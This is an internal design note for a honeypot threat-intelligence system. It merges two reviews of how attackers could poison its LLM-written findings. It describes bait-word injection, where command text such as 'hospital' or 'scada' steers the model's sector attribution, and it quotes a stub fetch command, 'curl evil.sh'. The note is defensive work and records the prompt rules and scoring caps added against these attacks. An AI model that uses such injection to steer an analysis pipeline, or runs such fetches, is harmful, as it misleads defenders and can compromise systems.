# Poisoned evidence — combined best plan (2026-08-04)

Merges `notes/poisoning-claude.md` and `notes/poisoning-chatgpt.md`.

## The governing principle (both reviewers, same words almost exactly)

> Attacker-controlled content can describe **what the attacker typed**. It can
> never establish **who they are, what sector they targeted, what malware they
> used, or how important the finding is.**

## Where each of us was right

**ChatGPT caught a vector I missed entirely: sector-attribution poisoning via
command text.** I had only considered the expensive version (fingerprint our
sensors, then hit one deliberately). The cheap version is typing `hospital`,
`scada`, `dicom`, `plant` into a command and letting the narrative model infer
targeting from it. Our *deterministic* sector attribution is safe — it comes
from `t-pot_hostname`, which an attacker cannot forge — but the LLM reads raw
commands and could have inferred sector intent from bait words. **Fixed.**

**ChatGPT was also sharper on three points:**
- **ATT&CK success vs attempted vs claimed.** `curl evil.sh` that *fails*
  still mapped to T1105 in our system. A command issued is not a technique
  that succeeded.
- **Novelty decomposition** — structural vs token vs actor vs campaign
  novelty. Random filenames should not read as new tradecraft.
- **Reputation-blind is the absence of classification, not evidence of
  importance** — and an adversary can enter that queue *deliberately* by
  using clean infrastructure. Our flagship product is gameable by design.

**What I contributed that it did not emphasise:**
- **Provenance split** (`evidence` vs `asserted`) as a schema-level control,
  not just a rule.
- **Forgery cost as an explicit confidence ceiling** per finding type.
- **Persistence as the strongest anti-poisoning signal** — which makes the
  findings registry itself a security control, not just reporting plumbing.
- **Not naming vendors** also denies an adversary knowledge of which feeds we
  can and cannot see with.

## Implemented today

| Control | Where |
|---|---|
| `evidence` (observed) vs `asserted` (attacker-claimed) columns | `findings.py` schema |
| URLs in commands captured as **asserted**, never as infrastructure | `cowrie_ttp.py` |
| Forgery-cost confidence ceilings (trivial 20 → high 90) | `FORGERY_COST` |
| `assess_poisoning()` → `poisoning_risk`, `poisoning_flags`, `evidence_strength` | `findings.py` |
| Priority hard-capped by poisoning risk (high → 55, critical → 30) | `score()` |
| Persistence (`days_seen`) weighted in priority | `score()` |
| **Sector attribution may not come from command text** | all three prompts |
| **ATT&CK must say "attempted" absent evidence of effect** | all three prompts |
| **Never name commercial vendors/feeds** (operator instruction) | all three prompts |

**Measured effect:** single-IP reputation-blind findings dropped from priority
80 to 55 and now carry `high` poisoning risk with three named reasons, while
multi-host ASN campaigns correctly remain on top. The system now ranks
*hard-to-fake* findings above *striking-looking* ones.

## Structurally forbidden (merged list)

1. Attribution — actor, malware family, or nation — from attacker-controlled
   text, handles, comments, banners, or payload names.
2. Sector attribution from command content rather than sensor identity.
3. Publishing asserted infrastructure as observed infrastructure.
4. ATT&CK "success" without evidence the effect occurred.
5. Any single-observation finding leaving the building.
6. ASN responsibility claims from source IPs alone ("activity from ASN X",
   never "ASN X is responsible").
7. LLM-generated facts, ids, scores, statuses, or mappings.
8. Naming commercial intelligence vendors in any output.

## Still to build

- `corroboration` levels populated (`internal_repeat` / `cross_sensor` /
  `external`) — the column exists, nothing writes it yet.
- ATT&CK evidence typing in the data model, not just the prompt.
- Novelty decomposition (structural vs token).
- Behaviour fingerprint alongside raw fingerprint — resists command padding.
  The 5080 already has `nomic-embed-text` for the similarity version.
- Shared-infrastructure guard (NAT / VPN / cloud egress / university) before
  any IP is published.
- Export gate enforcing: ≥3 distinct days, observed-only evidence, reviewed
  `true_positive`, poisoning risk ≤ medium.

## Internal vs external

**Internal briefs:** show everything, clearly labelled with poisoning risk and
flags. A high-risk single-session finding is still a useful lead to an analyst
who knows what it is.

**External (partners / OpenCTI / OTX):** strict gates, and defensive framing
always —

> "We observed activity from sources in ASN X against medtech-profile
> sensors."

never

> "ASN X is targeting hospitals."

That phrasing alone prevents most of the harm poisoning could cause, because
it makes the epistemic limits explicit to the recipient.
